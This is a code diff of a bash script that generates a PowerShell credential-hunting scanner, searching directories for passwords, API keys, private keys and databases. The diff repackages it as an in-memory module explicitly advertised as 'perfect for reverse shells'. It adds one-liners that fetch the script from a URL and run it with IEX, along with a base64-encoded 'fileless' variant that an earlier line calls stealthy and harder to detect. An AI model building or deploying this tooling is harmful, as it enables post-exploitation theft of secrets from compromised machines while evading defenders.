@@ -103,20 +103,27 @@ build_windows_command() {
     # Replace KEYWORDS
     if [[ -n "$kw" ]] && [[ "$cmd" == *"KEYWORDS"* ]]; then
         local keyword_pattern=$(echo "$kw" | sed 's/, */|/g')
+        keyword_pattern=$(echo "$keyword_pattern" | sed "s/'/''/g")
         cmd="${cmd//KEYWORDS/$keyword_pattern}"
     fi
     
-    # Replace EXTENSIONS (PowerShell style)
+    # Replace EXTENSIONS (Robust Array)
     if [[ -n "$ext" ]] && [[ "$cmd" == *"EXTENSIONS"* ]]; then
-        local include_list=$(echo "$ext" | sed 's/, */,/g' | xargs)
-        cmd="${cmd//EXTENSIONS/-Include $include_list}"
+        local clean_ext=$(echo "$ext" | sed "s/'/''/g")
+        local include_list=$(echo "$clean_ext" | sed "s/[[:space:]]*,[[:space:]]*/','/g")
+        cmd="${cmd//EXTENSIONS/-Include @('$include_list')}"
     fi
     
-    # Replace FILES (PowerShell style)
+    # Replace FILES (Robust Array)
     if [[ -n "$fls" ]] && [[ "$cmd" == *"FILES"* ]]; then
-        local include_list=$(echo "$fls" | sed 's/, */,/g' | xargs)
-        cmd="${cmd//FILES/-Include $include_list}"
+        local clean_fls=$(echo "$fls" | sed "s/'/''/g")
+        local include_list=$(echo "$clean_fls" | sed "s/[[:space:]]*,[[:space:]]*/','/g")
+        cmd="${cmd//FILES/-Include @('$include_list')}"
     fi
+
+    # SAFETY: If FILES or EXTENSIONS remain (because var was empty), remove them to prevent syntax errors
+    cmd="${cmd//EXTENSIONS/}"
+    cmd="${cmd//FILES/}"
     
     echo "$cmd"
 }
@@ -155,16 +162,16 @@ while IFS= read -r line || [[ -n "$line" ]]; do
         continue
     fi
     
-    # Parse fields
-    if [[ "$line" =~ ^"Linux Command: "(.+)$ ]]; then
+    # Parse fields with flexible regex (handles tabs/spaces)
+    if [[ "$line" =~ ^"Linux Command:"[[:space:]]*(.+)$ ]]; then
         linux_cmd="${BASH_REMATCH[1]}"
-    elif [[ "$line" =~ ^"Windows Command: "(.+)$ ]]; then
+    elif [[ "$line" =~ ^"Windows Command:"[[:space:]]*(.+)$ ]]; then
         windows_cmd="${BASH_REMATCH[1]}"
-    elif [[ "$line" =~ ^"Keywords: "(.+)$ ]]; then
+    elif [[ "$line" =~ ^"Keywords:"[[:space:]]*(.+)$ ]]; then
         keywords="${BASH_REMATCH[1]}"
-    elif [[ "$line" =~ ^"Extensions: "(.+)$ ]]; then
+    elif [[ "$line" =~ ^"Extensions:"[[:space:]]*(.+)$ ]]; then
         extensions="${BASH_REMATCH[1]}"
-    elif [[ "$line" =~ ^"Files: "(.+)$ ]]; then
+    elif [[ "$line" =~ ^"Files:"[[:space:]]*(.+)$ ]]; then
         files="${BASH_REMATCH[1]}"
     fi
 done < "$CONFIG_FILE"
@@ -180,120 +187,141 @@ echo ""
 echo "Generating standalone PowerShell script..."
 
 cat > "$OUTPUT_PS1" << 'PS_HEADER'
-# File Scanner - Standalone PowerShell Version
+# File Scanner - PowerShell Module
 # Auto-generated with pre-built commands - no parsing needed!
+#
+# USAGE:
+#   1. IEX + call:         IEX (IWR url/scanner.ps1 -UseBasicParsing).Content; Invoke-FileScan C:\path
+#   2. Dot-source + call:  . .\scanner.ps1; Invoke-FileScan -SearchRoot C:\path
+#   3. Direct call:        Import-Module .\scanner.ps1; Invoke-FileScan C:\path
+#
+# PERFECT FOR REVERSE SHELLS - Just IEX and call the function!
 
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$SearchRoot,
+function Invoke-FileScan {
+<#
+.SYNOPSIS
+    Security-focused file scanner for credentials, keys, and sensitive data
+
+.DESCRIPTION
+    Scans directories for credentials, API keys, private keys, certificates,
+    database files, configuration files, and other sensitive information.
     
-    [Parameter(Mandatory=$false)]
-    [string]$OutputFile = "findings_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt",
+    Pre-built search commands - no config parsing at runtime!
+
+.PARAMETER SearchRoot
+    Root directory to search (REQUIRED)
+
+.PARAMETER OutputFile
+    Output file path (default: findings_YYYYMMDD_HHMMSS.txt)
+
+.PARAMETER Verbose
+    Show detailed output including commands being run
+
+.EXAMPLE
+    Invoke-FileScan -SearchRoot C:\inetpub\wwwroot
+
+.EXAMPLE  
+    Invoke-FileScan -SearchRoot C:\Projects -Verbose
+
+.EXAMPLE
+    Invoke-FileScan -SearchRoot C:\ -OutputFile results.txt
     
-    [Parameter(Mandatory=$false)]
-    [switch]$Verbose,
-    
-    [Parameter(Mandatory=$false)]
-    [switch]$Help
-)
+.EXAMPLE
+    # After IEX / dot-sourcing
+    Invoke-FileScan C:\temp -Verbose
 
-if ($Help) {
-    Write-Host @"
-File Scanner - Standalone PowerShell Edition
-Pre-built commands - fast and simple!
+.NOTES
+    Can be used standalone or loaded into session like PowerUp/PowerView
+#>
 
-USAGE:
-    .\filescanner_standalone.ps1 -SearchRoot <path> [options]
-
-PARAMETERS:
-    -SearchRoot <path>  Root directory to search (REQUIRED)
-    -OutputFile <path>  Output file path (default: findings_YYYYMMDD_HHMMSS.txt)
-    -Verbose           Show detailed output
-    -Help              Show this help message
-
-EXAMPLES:
-    .\filescanner_standalone.ps1 -SearchRoot C:\inetpub\wwwroot
-    .\filescanner_standalone.ps1 -SearchRoot C:\Projects -Verbose
-    .\filescanner_standalone.ps1 -SearchRoot C:\data -OutputFile results.txt
-
-REMOTE EXECUTION:
-    IEX (irm https://your-server/filescanner_standalone.ps1)
-
-"@
-    exit 0
-}
-
-# Validate
-if (-not (Test-Path $SearchRoot)) {
-    Write-Error "Search root does not exist: $SearchRoot"
-    exit 1
-}
-
-# Create output directory
-$outputDir = Split-Path -Parent $OutputFile
-if ($outputDir -and -not (Test-Path $outputDir)) {
-    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
-}
-
-function Log {
-    param([string]$message, [bool]$toConsole = $false)
-    if ($toConsole -or $Verbose) {
-        Write-Host $message
-    }
-    Add-Content -Path $OutputFile -Value $message
-}
-
-function Run-Section {
+    [CmdletBinding()]
     param(
-        [string]$name,
-        [string]$command
+        [Parameter(Mandatory=$true, Position=0)]
+        [string]$SearchRoot,
+        
+        [Parameter(Mandatory=$false)]
+        [string]$OutputFile = "findings_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
     )
-    
-    Log "`n=== $name ===" $false
-    
-    if ($Verbose) {
-        Log "Command: $command" $true
+
+    # Validate
+    if (-not (Test-Path $SearchRoot)) {
+        Write-Error "Search root does not exist: $SearchRoot"
+        return
     }
-    
-    try {
-        # Replace placeholder in command
-        $actualCmd = $command -replace '\$SEARCH_ROOT', "'$SearchRoot'"
-        
-        # Execute and capture output
-        $results = Invoke-Expression $actualCmd 2>$null
-        
-        if ($results) {
-            if ($results -is [Array]) {
-                foreach ($result in $results) {
-                    Log $result $Verbose
-                }
-            } else {
-                Log $results $Verbose
-            }
-        } elseif ($Verbose) {
-            Log "No matches found" $true
+
+    # Create output directory
+    $outputDir = Split-Path -Parent $OutputFile
+    if ($outputDir -and -not (Test-Path $outputDir)) {
+        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+    }
+
+    # Initialize output file
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    @(
+        "=" * 80
+        "File Scanner Results"
+        "=" * 80
+        "Scan started: $timestamp"
+        "Search root: $SearchRoot"
+        "Output file: $OutputFile"
+        "=" * 80
+        ""
+    ) | Out-File -FilePath $OutputFile -Encoding UTF8
+
+    Write-Host "[*] File Scanner - Module Mode" -ForegroundColor Cyan
+    Write-Host "[*] Search Root: $SearchRoot" -ForegroundColor Cyan
+    Write-Host "[*] Output File: $OutputFile" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Helper function to log
+    function Log {
+        param([string]$message, [bool]$toConsole = $false)
+        if ($toConsole -or $VerbosePreference -eq 'Continue') {
+            Write-Host $message
         }
-    } catch {
-        if ($Verbose) {
+        Add-Content -Path $OutputFile -Value $message
+    }
+
+    # Function to run each section
+    function Run-Section {
+        param(
+            [string]$name,
+            [string]$command
+        )
+        
+        Log "`n=== $name ===" $true
+        
+        if ($VerbosePreference -eq 'Continue') {
+            Log "Command: $command" $true
+        }
+        
+        try {
+            # Replace placeholder - use escaped quotes for paths with spaces
+            $actualCmd = $command.Replace('$SEARCH_ROOT', $SearchRoot)
+            
+            # Execute
+            $results = Invoke-Expression $actualCmd 2>$null
+            
+            if ($results) {
+                if ($results -is [Array]) {
+                    foreach ($result in $results) {
+                        Log $result ($VerbosePreference -eq 'Continue')
+                    }
+                } else {
+                    Log $results ($VerbosePreference -eq 'Continue')
+                }
+                Log "Found $($results.Count) results" $true
+            } else {
+                if ($VerbosePreference -eq 'Continue') {
+                    Log "No findings" $true
+                }
+            }
+        } catch {
             Log "Error: $_" $true
         }
     }
-}
 
-# Write header
-@(
-    "Starting search from: $SearchRoot"
-    "Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    "=" * 40
-) | Set-Content -Path $OutputFile
-
-if ($Verbose) {
-    Get-Content $OutputFile | ForEach-Object { Write-Host $_ }
-}
-
-# === SCAN SECTIONS ===
-# Auto-generated commands below
-
+    # Execute all scan sections
 PS_HEADER
 
 # Add each section as a function call
@@ -301,29 +329,41 @@ for ((i=0; i<${#SECTION_NAMES[@]}; i++)); do
     section_name="${SECTION_NAMES[$i]}"
     windows_cmd="${WINDOWS_COMMANDS[$i]}"
     
-    # Escape single quotes for PowerShell
-    windows_cmd_escaped=$(echo "$windows_cmd" | sed "s/'/\`'/g")
+    # For PowerShell: Use single-quoted strings (@'...'@) for the command to avoid all escaping
+    # Only the section name needs quote escaping
+    section_name_escaped=$(echo "$section_name" | sed "s/'/''/ g")
     
+    # Write using PowerShell's here-string for the command (avoids all escaping issues)
     cat >> "$OUTPUT_PS1" << EOF
-Run-Section '$section_name' '$windows_cmd_escaped'
+Run-Section '$section_name_escaped' @'
+$windows_cmd
+'@
 EOF
 done
 
 # Add footer
 cat >> "$OUTPUT_PS1" << 'PS_FOOTER'
 
-# Write footer
-@(
-    ""
-    "=" * 40
-    "Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-) | Add-Content -Path $OutputFile
+    # Write footer
+    @(
+        ""
+        "=" * 80
+        "Scan completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        "Results saved to: $OutputFile"
+        "=" * 80
+    ) | Add-Content -Path $OutputFile
 
-if ($Verbose) {
-    Get-Content $OutputFile | Select-Object -Last 3 | ForEach-Object { Write-Host $_ }
+    Write-Host ""
+    Write-Host "[+] Scan Complete!" -ForegroundColor Green
+    Write-Host "[+] Results saved to: $OutputFile" -ForegroundColor Green
+    Write-Host ""
+    
+    # Return output file path
+    return $OutputFile
 }
 
-Write-Host "Results saved to: $OutputFile" -ForegroundColor Green
+# Function is now loaded and ready to use
+# Call it with: Invoke-FileScan -SearchRoot C:\path
 PS_FOOTER
 
 echo "✓ Generated: $OUTPUT_PS1"
@@ -332,11 +372,14 @@ echo "✓ Generated: $OUTPUT_PS1"
 echo ""
 echo "Generating base64 encoded PowerShell (fileless execution)..."
 OUTPUT_PS1_B64="${SCRIPT_DIR}/filescanner_standalone_encoded.txt"
-base64 -w 0 "$OUTPUT_PS1" > "$OUTPUT_PS1_B64"
+
+# Encode with no line wrapping and remove any potential issues
+base64 -w 0 "$OUTPUT_PS1" | tr -d '\n\r' > "$OUTPUT_PS1_B64"
+
 echo "✓ Generated: $OUTPUT_PS1_B64"
 echo ""
 echo "  Fileless execution usage:"
-echo '    $c = Get-Content filescanner_standalone_encoded.txt'
+echo '    $c = (Get-Content filescanner_standalone_encoded.txt -Raw).Trim()'
 echo '    $d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))'
 echo '    IEX $d'
 
@@ -494,12 +537,19 @@ echo "  PowerShell (normal):  $OUTPUT_PS1"
 echo "  PowerShell (base64):  $OUTPUT_PS1_B64"
 echo "  Bash:                 $OUTPUT_SH"
 echo ""
-echo "Usage:"
-echo "  PowerShell (normal):  .\\filescanner_standalone.ps1 -SearchRoot C:\\path"
-echo "  PowerShell (base64):  \$c=Get-Content filescanner_standalone_encoded.txt; IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$c)))"
-echo "  Bash:                 ./filescanner_standalone.sh -r /path"
+echo "PowerShell Usage (Module-Style):"
+echo "  1. IEX + Function:     IEX (IWR url/scanner.ps1 -UseBasicParsing).Content; Invoke-FileScan C:\\path"
+echo "  2. Dot-source:         . .\\scanner.ps1; Invoke-FileScan -SearchRoot C:\\path"
+echo "  3. Direct (old way):   .\\scanner.ps1 -SearchRoot C:\\path"
 echo ""
-echo "Choose based on scenario:"
-echo "  - Normal version: Easy to debug, audit, modify"
-echo "  - Base64 version: Fileless, stealthy, harder to detect"
+echo "Base64 Usage (Fileless):"
+echo "  \$c=(IWR url/encoded.txt -UseBasicParsing).Content.Trim(); \$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$c)); IEX \$d; Invoke-FileScan C:\\"
+echo ""
+echo "Bash Usage:"
+echo "  ./filescanner_standalone.sh -r /path"
+echo ""
+echo "Perfect for:"
+echo "  - Reverse shells (IEX + Invoke-FileScan)"
+echo "  - Fileless execution (base64)"
+echo "  - Module-style like PowerUp.ps1"
 echo ""
